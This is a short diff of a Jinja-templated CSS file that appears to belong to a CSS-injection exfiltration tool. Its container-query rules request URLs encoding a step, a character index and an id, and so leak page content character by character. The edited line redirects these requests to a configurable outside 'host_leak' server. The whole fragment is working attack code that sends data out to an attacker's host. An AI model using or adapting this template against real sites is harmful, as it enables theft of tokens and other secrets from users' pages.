@@ -83,7 +83,7 @@ body {
 {% for container in width_containers %}
 @container leak (width: {{ container.width }}px) {
     head::before {
-        content: var(--r1, var(--r2, url("/leak?step={{ step }}&idx={{ container.char_idx }}&id={{ id }}")));
+        content: url("{{ host_leak }}/leak?step={{ step }}&idx={{ container.char_idx }}&id={{ id }}");
     }
 }
 {% endfor %}
